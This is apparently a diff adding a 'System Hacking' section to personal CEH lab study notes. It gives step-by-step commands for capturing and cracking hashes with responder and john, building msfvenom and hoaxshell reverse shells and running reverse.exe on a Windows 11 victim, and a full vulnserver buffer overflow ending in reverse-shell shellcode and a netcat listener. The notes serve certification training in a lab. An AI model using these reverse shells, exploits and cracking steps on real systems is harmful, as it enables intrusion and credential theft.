@@ -542,3 +542,219 @@ passward:admin admin
 
 </details>
 
+# System Hacking
+<details>
+
+<summary>Crack the password using responder</summary>
+
+* cmd to run responder
+```console
+~$:sudo responder -I eth0
+-I>>interface
+
+in target system run bar \\CEH-Tools
+and in parrot copy the capture hash availed in responder
+and in another sudo terminal
+pluma hash.txt n copy it here
+```
+//then decript using john
+```console
+~$:john hash.txt
+```
+</details>
+<details>
+<summary>Access remote system using Reverse shell generator</summary>
+
+* Enable reverse shell
+```console
+~$:docker run -d -p 80:80 reverse_shell_generator
+```
+* firefox >> http://localhost
+```console
+~$:In the IP field, type [attacker sys ip] as listener IP and in the Port field, type 4444 as listener port.
+
+and copy the msfvenom cmd in the same window and paste it in cmd (windows meterpreter reverse TCP)
+
+We will start a listener using Reverse Shell Generator, to do so, switch to the browser window and select msfconsole as Type from the drop-down under Listener.
+and copy the code >> paste it in cmd >> listner will start
+
+In attacker system go to file (ctrl L) and type smb://10.10.1.11 to get win 11 files 
+Navigate to CEHv13 Module 06 System Hacking and paste the copied reverse.exe file.
+
+in victm machine navigate to CEH tool and copy the reverse.exe and copy it to desktop
+double click it (exe)
+
+```
+
+* After session created
+```console
+~$: getuid (to get the user details)
+```
+
+* Now by powershell script
+```console
+~$: in firefox reverse shell page select PowerShell IEX and change port to 444 and copy the code
+
+and in new su cmd 
+pluma shell.ps1 and copy the code and save
+
+and now we have to create a hoaxshell listner for that
+back to reverseshell browser window and input 444 as port and select hoaxshell
+copy paste it in cmd and enter
+
+
+now copy the shell file wee created and paste it in wind 11 cehtool folder by smb://10.10.1.11
+in winn 11 navigate to this file and paste it in win 11 desktop
+```
+
+* open powershell as a admin
+then type
+```console
+~$: cd C:\Users\Admin\Desktop
+and run .\"filename"
+>>to run a file in victim machine
+```
+</details>
+<details>
+<summary>Perform Buffer Overflow Attack to Gain Access to a Remote System</summary>
+
+* download vulnserver from module6 file and run
+* and also install immunity debugger and run it as admin
+```console
+~$:click file in the menu bar
+and click attach n attach the vulnserver
+then run it (play button at top)
+```
+* shift to parrot
+```console
+~$:nc -nv 10.10.1.11 9999
+-n >> dont try to resolve hostname with dns, use the ip exactly as given
+
+type HELP
+```
+* Generate spike template and performing spiking
+//to create a spike template on STATS function
+```console
+
+~$: pluma stats.spk and type the following cmd
+
+s_readline();
+
+s_string("STATS ");
+
+s_string_variable("0");
+```
+* to send the package to vulberable server
+```console
+~$: generic_send_tcp 10.10.1.11 9999 stats.spk 0 0
+here STATS fn is not vulnerable to bufferoverflow
+```
+* so we will perform TRUN function
+```console
+~$:pluma trun.spk
+and type
+s_readline();
+
+s_string("TRUN ");
+
+s_string_variable("0");
+```
+* run
+```console
+~$: generic_send_tcp 10.10.1.11 9999 trun.spk 0 0
+```
+* Now performing FUZZING
+```console
+~$:navigate to ceh tools and buffer over flow file copy script file and paste it in desktop
+now perform python script to perform fuzzing
+
+navigate to cd /home/attacker/Desktop/Scripts/
+```
+execute
+```console
+~$:chmod +x fuzz.py
+./fuzz.py
+```
+* pattern create by ruby tool (in a same script file)
+```console
+~$:in linux cmd >> /usr/share/metasploit-framework/tools/exploit/pattern_crteate.rb -l 1040
+-l>>leangth of a byte size
+
+>>it creates some random piece of bytes
+copy the characters
+>>
+paste it in
+ pluma findoff.py (script file)
+>>in bw offset ""
+
+chmod +x findoff.py
+./findoff.py
+and open immunity debugger and notedown the EIP (offset value)
+```
+then
+```console
+~$: /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 10400 -q (offset value)
+-q>>offset value
+then close the cmd window
+resrart the immunity devbugger and vuln server
+```
+then (in script file)
+```console
+~$: chmod +x overwrite.py
+./overwrite.py
+>> to overwrite EIP
+```
+* by bad chars
+```console
+~$: chmod +x badchars.py (in script folder)
+./badchars.py
+
+>> in immunity debugger click on ESP and follow in dump option
+```
+* Now we have to identify the right module of the vulnerable server (mona.py)
+```console
+~$: navigate to E:\CEH-Tools\CEHv13 Module 06 System Hacking\Buffer Overflow Tools\Scripts, copy the mona.py script, and paste it in the location in windows 11 C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands
+```
+nxt open immunity debugger
+and type !mona modules in txt field of immunity debugger
+observe that essfunc.dll have no memory protection
+
+```console
+~$: in unix cmd 
+python3 /home/attacker/converter.py
+Enter the assembly code here : prompt appears; type JMP ESP and press Enter.
+
+here ffe4
+
+In the Immunity Debugger window, type !mona find -s "\xff\xe4" -m essfunc.dll and press Enter in the text field present at the bottom of the window.
+
+the address of vulnerable module you will found in first result
+
+
+ Immunity Debugger window, click the Go to address in Disassembler icon (the arrow towards right)
+in pop enter the address of vulnerable module (625011af)
+run debugger
+
+and in script file
+chmod +x jump.py
+./jump.py
+>> which over right the EIP
+```
+* then to generate a shell code
+```console
+~$: msfvenom -p windows/shell_reverse_tcp LHOST=[Local IP Address] LPORT=[Listening Port] EXITFUNC=thread -f c -a x86 -b "\x00"
+
+>>Here, -p: payload, local IP address: 10.10.1.13, listening port: 4444, -f: filetype, -a: architecture, -b: bad character.
+
+copy the granted shellcode
+and paste it in
+pluma shellcode.py
+add b in every line to convert string to bytes
+```
+then before running the command we have to create a listner by netcat
+```console
+~$: nc -nvlp 4444
+and in script folder path
+chmod +x shellcode.py
+./shellcode.py
+```
